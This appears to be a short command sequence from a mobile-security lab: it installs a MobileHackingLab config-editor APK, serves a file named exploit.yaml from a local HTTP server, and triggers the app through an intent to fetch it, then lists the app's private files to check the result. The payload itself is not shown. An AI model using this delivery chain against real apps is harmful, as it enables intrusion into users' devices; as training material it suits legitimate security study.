adb install com.mobilehackinglab.configeditor.apk
python3 -m http.server 8080 -d http_server &> /dev/null &
adb shell 'am start -n com.mobilehackinglab.configeditor/.MainActivity -a android.intent.action.VIEW -d http://10.0.2.2:8080/exploit.yaml'
adb shell 'ls /data/data/com.mobilehackinglab.configeditor/files/'

